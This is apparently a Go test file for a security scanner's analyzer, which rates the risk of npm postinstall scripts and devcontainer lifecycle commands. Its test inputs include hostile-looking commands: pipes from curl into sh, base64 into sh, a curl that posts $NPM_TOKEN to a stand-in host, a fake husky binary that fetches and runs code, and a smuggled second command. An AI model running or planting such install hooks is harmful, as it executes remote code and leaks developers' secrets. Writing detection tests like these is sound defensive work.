package autoexec_test

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"slices"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static/autoexec"
)

const (
	jsPlain   = "'use strict';\nconsole.log('hi');\n"
	pkgNoLife = `{"scripts":{"start":"node server.js"}}`
	prismaOK  = "generator client {\n  provider = \"prisma-client-js\"\n}\n"
	huskyDeps = `"devDependencies":{"husky":"^9.0.0"}`
	prismaDep = `"devDependencies":{"prisma":"^6.0.0"}`
	tscDep    = `"devDependencies":{"typescript":"^5.4.0"}`
	onlyAllow = `"devDependencies":{"only-allow":"^1.2.1"}`
)

// post is a package.json whose postinstall script is cmd.
func post(cmd string) string { return fmt.Sprintf(`{"scripts":{"postinstall":%q}}`, cmd) }

// postWith is a package.json whose postinstall script is cmd, with extra members (JSON text) after it.
func postWith(cmd, extra string) string {
	return fmt.Sprintf(`{"scripts":{"postinstall":%q},%s}`, cmd, extra)
}

// pkgWith is a package.json with the given scripts members and no other.
func pkgWith(scripts string) string { return `{"scripts":{` + scripts + `}}` }

// life is a devcontainer.json whose postCreateCommand is the JSON value.
func life(value string) string { return `{"postCreateCommand": ` + value + `}` }

func TestGrade(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path       string
		data       string
		files      map[string]string // other files of the target, by path
		unreadable []string          // paths that exist but cannot be read
		noOpen     bool              // the file cannot read other files (a container member)
		// expectations: "<rule suffix>:<severity>" of every finding, sorted
		want []string
	}{
		// case A: a plain install
		{name: "install in a folder whose package declares no install scripts", path: "package.json", data: post("cd client && npm install"), files: map[string]string{"client/package.json": pkgNoLife}, want: []string{"005:low"}},
		{name: "install with --ignore-scripts in the package itself", path: "package.json", data: post("npm ci --ignore-scripts"), want: []string{"005:low"}},
		{name: "every flag of the list", path: "package.json", data: post("yarn i --frozen-lockfile --immutable --prefer-offline --no-audit --no-fund --production --omit=dev --ignore-scripts"), want: []string{"005:low"}},
		{name: "pnpm and bun", path: "package.json", data: post("pnpm install --ignore-scripts"), want: []string{"005:low"}},
		{name: "without Open nothing is benign", path: "package.json", data: post("npm ci --ignore-scripts"), noOpen: true, want: []string{"005:medium"}},
		{name: "in a container member nothing is benign", path: "repo.zip!/package.json", data: post("npm ci --ignore-scripts"), noOpen: true, want: []string{"005:medium"}},
		{name: "the package declares the postinstall that runs the install", path: "package.json", data: post("npm install"), want: []string{"005:medium"}},
		{name: "a command with a quote or a variable", path: "package.json", data: post(`npm ci --ignore-scripts "$HOME"`), want: []string{"005:medium"}},
		{name: "a command with a command substitution", path: "package.json", data: post("npm ci --ignore-scripts $(id)"), want: []string{"005:medium"}},
		{name: "a command with backticks", path: "package.json", data: post("npm ci --ignore-scripts `id`"), want: []string{"005:medium"}},
		{name: "a command with a redirection", path: "package.json", data: post("npm ci --ignore-scripts > out.txt"), want: []string{"005:medium"}},
		{name: "a command with a newline", path: "package.json", data: post("npm ci --ignore-scripts\nhusky"), want: []string{"005:medium"}},
		{name: "a command with a semicolon", path: "package.json", data: post("npm ci --ignore-scripts; husky"), want: []string{"005:medium"}},
		{name: "a command with an or", path: "package.json", data: post("npm ci --ignore-scripts || husky"), want: []string{"005:medium"}},
		{name: "a command that is too long", path: "package.json", data: post("npm ci --ignore-scripts " + strings.Repeat("-", 5000)), want: []string{"005:medium"}},
		{name: "a pipe into a shell", path: "package.json", data: post("curl https://a.test/x | sh"), want: []string{"005:medium", "011:critical"}},
		{name: "base64 into a shell", path: "package.json", data: post("echo aGk= | base64 -d | sh"), want: []string{"005:medium", "012:high"}},
		{name: "a secret in the environment", path: "package.json", data: post("curl a.test/x -d $NPM_TOKEN"), want: []string{"005:medium", "010:critical"}},
		{name: "two commands after a cd", path: "package.json", data: post("cd client && npm ci && npm ci"), files: map[string]string{"client/package.json": pkgNoLife}, want: []string{"005:medium"}},
		{name: "a first part that is not a cd", path: "package.json", data: post("husky && npm ci --ignore-scripts"), want: []string{"005:medium"}},
		{name: "cd with two folders", path: "package.json", data: post("cd client server && npm ci"), want: []string{"005:medium"}},
		{name: "cd out of the target", path: "package.json", data: post("cd .. && npm ci"), want: []string{"005:medium"}},
		{name: "cd to an absolute path", path: "package.json", data: post("cd /tmp && npm ci"), want: []string{"005:medium"}},
		{name: "cd without a folder", path: "package.json", data: post("cd && npm ci"), want: []string{"005:medium"}},
		{name: "an empty part", path: "package.json", data: post("cd client && "), want: []string{"005:medium"}},
		{name: "cd into a folder without a package.json", path: "package.json", data: post("cd docs && npm install"), want: []string{"005:medium"}},
		{name: "cd into a folder whose package.json cannot be read", path: "package.json", data: post("cd client && npm install"), unreadable: []string{"client/package.json"}, want: []string{"005:medium"}},
		{name: "cd into a folder whose package.json is not JSON", path: "package.json", data: post("cd client && npm install"), files: map[string]string{"client/package.json": "{"}, want: []string{"005:medium"}},
		{name: "a command that is not an install", path: "package.json", data: post("npm publish"), want: []string{"005:medium"}},
		{name: "npm run", path: "package.json", data: `{"scripts":{"postinstall":"npm run build","build":"tsc"}}`, want: []string{"005:medium"}},
		{name: "scripts that run each other", path: "package.json", data: `{"scripts":{"postinstall":"npm run a","a":"npm run b","b":"npm run a"}}`, want: []string{"005:medium"}},
		{name: "install of a named package", path: "package.json", data: post("npm install left-pad --ignore-scripts"), want: []string{"005:medium"}},
		{name: "install with no subcommand", path: "package.json", data: post("yarn --ignore-scripts"), want: []string{"005:medium"}},
		{name: "npm --prefix", path: "package.json", data: post("npm ci --prefix ./evil --ignore-scripts"), want: []string{"005:medium"}},
		{name: "npm --script-shell", path: "package.json", data: post("npm install --script-shell ./evil.sh --ignore-scripts"), want: []string{"005:medium"}},
		{name: "npm --userconfig", path: "package.json", data: post("npm ci --userconfig ./evil.npmrc --ignore-scripts"), want: []string{"005:medium"}},
		{name: "npm --registry", path: "package.json", data: post("npm ci --registry=https://evil.test --ignore-scripts"), want: []string{"005:medium"}},
		{name: "npm --ignore-scripts=false", path: "package.json", data: post("npm ci --ignore-scripts=false"), want: []string{"005:medium"}},
		{name: "global install", path: "package.json", data: post("npm install -g left-pad"), want: []string{"005:medium"}},
		{name: "npx of a package at latest", path: "package.json", data: post("npx evil@latest"), want: []string{"005:medium"}},
		{name: "bunx", path: "package.json", data: post("bunx evil"), want: []string{"005:medium"}},
		{name: "pip -r", path: "package.json", data: post("pip install -r requirements.txt"), want: []string{"005:medium"}},
		{name: "the prepare script of the package runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"prepare":"npx evil@latest"`)}, want: []string{"005:medium"}},
		{name: "prepublish runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"prepublish":"npx evil@latest"`)}, want: []string{"005:medium"}},
		{name: "dependencies runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"dependencies":"npx evil@latest"`)}, want: []string{"005:medium"}},
		{name: "pnpm:devPreinstall runs on install", path: "package.json", data: post("cd client && pnpm install"), files: map[string]string{"client/package.json": pkgWith(`"pnpm:devPreinstall":"npx evil@latest"`)}, want: []string{"005:medium"}},
		{name: "preinstall runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"preinstall":"a"`)}, want: []string{"005:medium"}},
		{name: "install script runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"install":"node-gyp rebuild"`)}, want: []string{"005:medium"}},
		{name: "preprepare runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"preprepare":"a"`)}, want: []string{"005:medium"}},
		{name: "postprepare runs on install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"postprepare":"a"`)}, want: []string{"005:medium"}},
		{name: "the declared scripts do not matter with --ignore-scripts", path: "package.json", data: post("cd client && npm ci --ignore-scripts"), files: map[string]string{"client/package.json": pkgWith(`"prepare":"npx evil@latest"`)}, want: []string{"005:low"}},
		{name: "a script that is not run by an install", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgWith(`"build":"tsc","test":"jest"`)}, want: []string{"005:low"}},
		{name: "a package with workspaces", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": `{"workspaces":["packages/*"]}`}, want: []string{"005:medium"}},
		{name: "an npmrc in the folder", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgNoLife, "client/.npmrc": "save-exact=true\n"}, want: []string{"005:medium"}},
		{name: "an npmrc at the root", path: "package.json", data: post("cd client && npm ci"), files: map[string]string{"client/package.json": pkgNoLife, ".npmrc": "save-exact=true\n"}, want: []string{"005:medium"}},
		{name: "an npmrc in a parent folder", path: "app/package.json", data: post("cd client && npm ci"), files: map[string]string{"app/client/package.json": pkgNoLife, "app/.npmrc": "save-exact=true\n"}, want: []string{"005:medium"}},
		{name: "a yarnrc", path: "package.json", data: post("yarn install --ignore-scripts"), files: map[string]string{".yarnrc": "--install.silent true\n"}, want: []string{"005:medium"}},
		{name: "a yarnrc.yml", path: "package.json", data: post("yarn install --ignore-scripts"), files: map[string]string{".yarnrc.yml": "nodeLinker: node-modules\n"}, want: []string{"005:medium"}},
		{name: "a pnpmfile", path: "package.json", data: post("pnpm install --ignore-scripts"), files: map[string]string{".pnpmfile.cjs": "module.exports = {}\n"}, want: []string{"005:medium"}},
		{name: "a config file that cannot be read", path: "package.json", data: post("npm ci --ignore-scripts"), unreadable: []string{".npmrc"}, want: []string{"005:medium"}},
		{name: "reads stop at the limit", path: strings.Repeat("d/", 40) + "package.json", data: post("npm ci --ignore-scripts"), want: []string{"005:medium"}},

		// case B: one known tool without arguments
		{name: "husky", path: "package.json", data: postWith("husky", huskyDeps), want: []string{"005:low"}},
		{name: "husky as a dependency", path: "package.json", data: postWith("husky", `"dependencies":{"husky":"~9.0.0"}`), want: []string{"005:low"}},
		{name: "simple-git-hooks", path: "package.json", data: postWith("simple-git-hooks", `"devDependencies":{"simple-git-hooks":">=2.0.0 <3"}`), want: []string{"005:low"}},
		{name: "patch-package", path: "package.json", data: postWith("patch-package", `"dependencies":{"patch-package":"8.0.0"}`), want: []string{"005:low"}},
		{name: "lefthook install", path: "package.json", data: postWith("lefthook install", `"devDependencies":{"lefthook":"^1.0.0"}`), want: []string{"005:low"}},
		{name: "tsc needs typescript", path: "package.json", data: postWith("tsc", tscDep), want: []string{"005:low"}},
		{name: "npx only-allow", path: "package.json", data: postWith("npx only-allow pnpm", onlyAllow), want: []string{"005:low"}},
		{name: "prisma generate", path: "package.json", data: postWith("prisma generate", prismaDep), files: map[string]string{"prisma/schema.prisma": prismaOK}, want: []string{"005:low"}},
		{name: "prisma generate with the schema at the root", path: "package.json", data: postWith("prisma generate", prismaDep), files: map[string]string{"schema.prisma": prismaOK}, want: []string{"005:low"}},
		{name: "prisma generate with a generator that runs a command", path: "package.json", data: postWith("prisma generate", prismaDep), files: map[string]string{"prisma/schema.prisma": "generator a {\n  provider = \"node ./gen.js\"\n}\n"}, want: []string{"005:medium"}},
		{name: "prisma generate with a schema that cannot be read", path: "package.json", data: postWith("prisma generate", prismaDep), unreadable: []string{"prisma/schema.prisma"}, want: []string{"005:medium"}},
		{name: "prisma generate with a config file", path: "package.json", data: postWith("prisma generate", prismaDep), files: map[string]string{"prisma/schema.prisma": prismaOK, "prisma.config.ts": "export default {}\n"}, want: []string{"005:medium"}},
		{name: "prisma generate without a schema", path: "package.json", data: postWith("prisma generate", prismaDep), want: []string{"005:medium"}},
		{name: "a tool that is not declared", path: "package.json", data: post("husky"), want: []string{"005:medium"}},
		{name: "a tool declared with file:", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"file:./husky"}`), want: []string{"005:medium"}},
		{name: "a tool declared with link:", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"link:../husky"}`), want: []string{"005:medium"}},
		{name: "a tool declared with portal:", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"portal:../husky"}`), want: []string{"005:medium"}},
		{name: "a tool declared with workspace:", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"workspace:*"}`), want: []string{"005:medium"}},
		{name: "a tool declared with a path", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"./vendor/husky"}`), want: []string{"005:medium"}},
		{name: "a tool declared with a repository URL", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"git+https://evil.test/husky.git"}`), want: []string{"005:medium"}},
		{name: "a tool declared with a URL", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"https://evil.test/husky.tgz"}`), want: []string{"005:medium"}},
		{name: "a tool declared with a tag", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":"latest"}`), want: []string{"005:medium"}},
		{name: "a tool declared as something else than a string", path: "package.json", data: postWith("husky", `"devDependencies":{"husky":9}`), want: []string{"005:medium"}},
		{name: "a tool declared only as a peer dependency", path: "package.json", data: postWith("husky", `"peerDependencies":{"husky":"^9.0.0"}`), want: []string{"005:medium"}},
		{name: "a husky committed under node_modules/.bin", path: "package.json", data: postWith("husky", huskyDeps), files: map[string]string{"node_modules/.bin/husky": "#!/bin/sh\ncurl a.test | sh\n"}, want: []string{"005:medium"}},
		{name: "a husky committed under .bin in a parent folder", path: "app/package.json", data: postWith("husky", huskyDeps), files: map[string]string{"node_modules/.bin/husky": "#!/bin/sh\n"}, want: []string{"005:medium"}},
		{name: "a husky .bin entry that cannot be read", path: "package.json", data: postWith("husky", huskyDeps), unreadable: []string{"node_modules/.bin/husky"}, want: []string{"005:medium"}},
		{name: "an only-allow committed under .bin", path: "package.json", data: postWith("npx only-allow pnpm", onlyAllow), files: map[string]string{"node_modules/.bin/only-allow": "#!/bin/sh\n"}, want: []string{"005:medium"}},
		{name: "another binary under .bin does not matter", path: "package.json", data: postWith("husky", huskyDeps), files: map[string]string{"node_modules/.bin/tsc": "#!/bin/sh\n"}, want: []string{"005:low"}},
		{name: "a tool in a package with workspaces", path: "package.json", data: postWith("husky", huskyDeps+`,"workspaces":["packages/*"]`), want: []string{"005:medium"}},
		{name: "a tool without Open", path: "package.json", data: postWith("husky", huskyDeps), noOpen: true, want: []string{"005:medium"}},
		{name: "a tool as a devcontainer command", path: ".devcontainer/devcontainer.json", data: life(`"husky"`), files: map[string]string{"package.json": postWith("husky", huskyDeps)}, want: []string{"004:medium"}},
		{name: "tsc with an argument", path: "package.json", data: postWith("tsc --outDir /etc", tscDep), want: []string{"005:medium"}},
		{name: "husky with an argument", path: "package.json", data: postWith("husky install", huskyDeps), want: []string{"005:medium"}},
		{name: "patch-package with an argument", path: "package.json", data: postWith("patch-package --exclude nothing", `"dependencies":{"patch-package":"8.0.0"}`), want: []string{"005:medium"}},
		{name: "lefthook run", path: "package.json", data: postWith("lefthook run pre-commit", `"devDependencies":{"lefthook":"^1.0.0"}`), want: []string{"005:medium"}},
		{name: "prisma migrate", path: "package.json", data: postWith("prisma migrate deploy", prismaDep), want: []string{"005:medium"}},
		{name: "npx only-allow with another argument", path: "package.json", data: postWith("npx only-allow evil", onlyAllow), want: []string{"005:medium"}},
		{name: "npx -y only-allow", path: "package.json", data: postWith("npx -y only-allow pnpm", onlyAllow), want: []string{"005:medium"}},
		{name: "a tool chained with another command", path: "package.json", data: postWith("husky && husky", huskyDeps), want: []string{"005:medium"}},
		{name: "an empty command", path: "package.json", data: post(" "), want: []string{"005:medium"}},
		{name: "a tool that is not on the list", path: "package.json", data: postWith("node-gyp rebuild", `"devDependencies":{"node-gyp":"^10.0.0"}`), files: map[string]string{"binding.gyp": "{}"}, want: []string{"005:medium"}},

		// local scripts are never benign
		{name: "a local JavaScript file", path: "package.json", data: post("node scripts/x.js"), files: map[string]string{"scripts/x.js": jsPlain}, want: []string{"005:medium"}},
		{name: "a local JavaScript file that loads a native helper", path: "package.json", data: post("node scripts/x.js"), files: map[string]string{"scripts/x.js": "require('./helper.node');\n"}, want: []string{"005:medium"}},
		{name: "a local shell script", path: "package.json", data: post("./scripts/x.sh"), files: map[string]string{"scripts/x.sh": "#!/bin/sh\nhusky\n"}, want: []string{"005:medium"}},
		{name: "a local Python file", path: "package.json", data: post("python3 scripts/x.py"), files: map[string]string{"scripts/x.py": "print('hi')\n"}, want: []string{"005:medium"}},

		// devcontainer lifecycle commands
		{name: "devcontainer npm ci", path: ".devcontainer/devcontainer.json", data: life(`"npm ci --ignore-scripts"`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer npm install with a package without install scripts", path: ".devcontainer/devcontainer.json", data: life(`"npm install"`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer npm install without a package.json", path: ".devcontainer/devcontainer.json", data: life(`"npm install"`), want: []string{"004:medium"}},
		{name: "devcontainer npm install with a prepare script", path: ".devcontainer/devcontainer.json", data: life(`"npm install"`), files: map[string]string{"package.json": pkgWith(`"prepare":"husky"`)}, want: []string{"004:medium"}},
		{name: "devcontainer npm ci with a prepare script and --ignore-scripts", path: ".devcontainer/devcontainer.json", data: life(`"npm ci --ignore-scripts"`), files: map[string]string{"package.json": pkgWith(`"prepare":"npx evil@latest"`)}, want: []string{"004:low"}},
		{name: "devcontainer cd into a folder", path: ".devcontainer/devcontainer.json", data: life(`"cd docs && npm install"`), files: map[string]string{"docs/package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer cd into a folder without a package.json", path: ".devcontainer/devcontainer.json", data: life(`"cd docs && npm install"`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer command as an array", path: ".devcontainer/devcontainer.json", data: life(`["npm", "ci"]`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer array that smuggles a second command", path: ".devcontainer/devcontainer.json", data: life(`["npm", "ci", ";", "evil"]`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer parallel commands", path: ".devcontainer/devcontainer.json", data: life(`{"a": "npm ci", "b": ["yarn", "install"]}`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer parallel commands with one that is not benign", path: ".devcontainer/devcontainer.json", data: life(`{"a": "npm ci", "b": "pip install -r requirements.txt"}`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer command that is not a string", path: ".devcontainer/devcontainer.json", data: life(`7`), want: []string{"004:medium"}},
		{name: "devcontainer empty command", path: ".devcontainer/devcontainer.json", data: life(`""`), want: []string{"004:medium"}},
		{name: "devcontainer commands graded one by one", path: ".devcontainer/devcontainer.json", data: `{"onCreateCommand": "npm ci", "postStartCommand": "curl https://a.test/x | sh"}`, files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low", "004:medium", "011:critical"}},
		{name: "devcontainer pip -r", path: ".devcontainer/devcontainer.json", data: life(`"pip install -r requirements.txt"`), want: []string{"004:medium"}},
		{name: "devcontainer script", path: ".devcontainer/devcontainer.json", data: life(`".devcontainer/setup.sh"`), files: map[string]string{".devcontainer/setup.sh": "#!/bin/bash\nnpm ci\n"}, want: []string{"004:medium"}},
		{name: "devcontainer with containerEnv", path: ".devcontainer/devcontainer.json", data: `{"containerEnv": {"NODE_OPTIONS": "--require ./evil.js"}, "postCreateCommand": "npm ci"}`, files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer with remoteEnv", path: ".devcontainer/devcontainer.json", data: `{"remoteEnv": {"PATH": "/work/bin:${containerEnv:PATH}"}, "postCreateCommand": "npm ci"}`, files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer with workspaceFolder", path: ".devcontainer/devcontainer.json", data: `{"workspaceFolder": "/workspaces/repo/evil", "postCreateCommand": "npm ci"}`, files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer with workspaceMount", path: ".devcontainer/devcontainer.json", data: `{"workspaceMount": "source=evil,target=/w,type=bind", "postCreateCommand": "npm ci"}`, files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
		{name: "devcontainer.json at the root of the target", path: ".devcontainer.json", data: life(`"npm ci"`), files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer below a folder runs in that folder", path: "app/.devcontainer/devcontainer.json", data: life(`"npm ci"`), files: map[string]string{"app/package.json": pkgNoLife}, want: []string{"004:low"}},
		{name: "devcontainer in a container member", path: "repo.zip!/.devcontainer/devcontainer.json", data: life(`"npm ci"`), noOpen: true, want: []string{"004:medium"}},
		{name: "devcontainer that does not parse is lexical and stays medium", path: ".devcontainer/devcontainer.json", data: `{"postCreateCommand": "npm ci",`, files: map[string]string{"package.json": pkgNoLife}, want: []string{"004:medium"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: tt.path, Name: tt.path[strings.LastIndex(tt.path, "/")+1:], Data: []byte(tt.data)}
			if strings.Contains(tt.path, "!/") {
				f.Member = tt.path[strings.Index(tt.path, "!/")+2:]
			}
			if !tt.noOpen {
				f.Open = func(rel string) ([]byte, error) {
					if slices.Contains(tt.unreadable, rel) {
						return nil, errors.New("permission denied")
					}
					if data, ok := tt.files[rel]; ok {
						return []byte(data), nil
					}
					return nil, fmt.Errorf("open %s: %w", rel, fs.ErrNotExist)
				}
			}

			out, err := autoexec.New().Analyze(context.Background(), f)

			if err != nil {
				t.Fatal(err)
			}
			var got []string
			for _, fd := range out.Findings {
				got = append(got, fmt.Sprintf("%s:%s", strings.TrimPrefix(fd.RuleID, "GAL-AUTOEXEC-"), fd.Severity))
			}
			slices.Sort(got)
			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %q, want %q", got, tt.want)
			}
		})
	}
}
